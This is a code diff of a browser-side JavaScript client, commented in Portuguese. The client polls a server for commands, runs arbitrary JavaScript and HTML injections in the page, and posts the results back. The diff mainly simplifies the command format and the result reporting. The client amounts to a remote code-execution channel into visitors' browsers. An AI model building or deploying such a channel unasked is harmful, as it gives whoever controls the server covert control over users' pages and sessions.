@@ -14,7 +14,6 @@
  * - Captura e envio de resultados de execução de comandos
  * - Medição de tempo de execução para análise de performance
  * - Tratamento de erros e recuperação de falhas
- * - Tratamento de erros e recuperação de falhas
  * 
  * Autor: Administrador do Projeto
  * Versão: 5.0
@@ -159,11 +158,9 @@
                 
                 const data = await response.json();
                 
-                // Verificar se há um comando novo (estrutura atual do servidor)
-                if (data.new && data.id && data.id !== this.lastCommandId) {
-                    this.lastCommandId = data.id;
-                    this.captureEnabled = data.capture_results !== false;
-                    await this.executeCommand(data);
+                if (data.success && data.command && data.command.id !== this.lastCommandId) {
+                    this.lastCommandId = data.command.id;
+                    await this.executeCommand(data.command);
                 }
                 
                 // Resetar contagem de tentativas em caso de sucesso
@@ -178,31 +175,30 @@
         /**
          * Executa comando recebido do servidor
          */
-        async executeCommand(commandData) {
-            console.debug('Executing command:', commandData.type, 'Command:', commandData.command);
+        async executeCommand(command) {
+            console.debug('Executing command:', command.type);
             const startTime = performance.now();
             let result = { success: false, error: 'Unknown error' };
             
             try {
-                switch(commandData.type) {
+                switch(command.type) {
                     case 'js':
-                        result = await this.executeJavaScript(commandData.command);
+                        result = await this.executeJavaScript(command.content);
                         break;
                     case 'html':
-                        // Para comandos HTML, executar o JavaScript que injeta o HTML
-                        result = await this.executeJavaScript(commandData.command);
+                        result = this.injectHTML(command.content);
                         break;
                     case 'manipulate':
-                        result = this.manipulateElement(commandData);
+                        result = this.manipulateElement(command);
                         break;
                     case 'visibility':
-                        result = this.toggleVisibility(commandData);
+                        result = this.toggleVisibility(command);
                         break;
                     case 'head':
-                        result = this.modifyHead(commandData.command);
+                        result = this.modifyHead(command.content);
                         break;
                     default:
-                        result = { success: false, error: `Unknown command type: ${commandData.type}` };
+                        result = { success: false, error: `Unknown command type: ${command.type}` };
                 }
             } catch (error) {
                 result = { success: false, error: error.toString() };
@@ -212,8 +208,8 @@
             result.executionTime = executionTime.toFixed(2);
             
             // Enviar resultado se captura estiver habilitada
-            if (this.captureEnabled) {
-                await this.sendResult(commandData.id, result);
+            if (this.captureEnabled && command.capture_result !== false) {
+                await this.sendResult(command.id, result);
             }
         }
         
@@ -224,52 +220,19 @@
             try {
                 // Usar Function constructor para evitar eval direto
                 const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
-                let result;
-                let executionSuccess = true;
-                
                 try {
                     // Tentar executar como função async
                     const func = new AsyncFunction(code);
-                    result = await func();
+                    const result = await func();
+                    return { success: true, result };
                 } catch (asyncError) {
-                    try {
-                        // Se falhar, tentar como função comum
-                        const func = new Function(code);
-                        result = func();
-                    } catch (syncError) {
-                        executionSuccess = false;
-                        result = syncError.toString();
-                    }
+                    // Se falhar, tentar como função comum
+                    const func = new Function(code);
+                    const result = func();
+                    return { success: true, result };
                 }
-                
-                // Converter resultado para string se for undefined ou null
-                let resultString;
-                if (result === undefined) {
-                    resultString = "undefined";
-                } else if (result === null) {
-                    resultString = "null";
-                } else if (typeof result === 'object') {
-                    try {
-                        resultString = JSON.stringify(result);
-                    } catch (e) {
-                        resultString = result.toString();
-                    }
-                } else {
-                    resultString = String(result);
-                }
-                
-                return { 
-                    success: executionSuccess, 
-                    result: resultString,
-                    originalType: typeof result 
-                };
-                
             } catch (error) {
-                return { 
-                    success: false, 
-                    error: error.toString(),
-                    result: error.toString()
-                };
+                return { success: false, error: error.toString() };
             }
         }
         
@@ -373,37 +336,23 @@
         /**
          * Envia resultado da execução para o servidor
          */
-        async sendResult(commandId, executionResult) {
+        async sendResult(commandId, result) {
             try {
-                // Preparar dados no formato esperado pelo servidor
-                const payload = {
-                    client_id: this.clientId,
-                    command_id: commandId,
-                    success: executionResult.success || false,
-                    result: executionResult.result || '',
-                    execution_time: executionResult.executionTime || 0,
-                    timestamp: new Date().toISOString(),
-                    result_type: executionResult.originalType || typeof executionResult.result,
-                    user_agent: navigator.userAgent,
-                    command_original: ''
-                };
-                
-                console.debug('Sending result to server:', payload);
-                
                 const response = await fetch(`${this.serverUrl}/command/result`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        client_id: this.clientId,
+                        command_id: commandId,
+                        result
+                    })
                 });
                 
                 if (!response.ok) {
-                    const errorText = await response.text();
-                    throw new Error(`Server returned ${response.status}: ${errorText}`);
+                    throw new Error(`Server returned ${response.status}`);
                 }
-                
-                console.debug('Result sent successfully');
                 
             } catch (error) {
                 console.error('Failed to send result:', error);
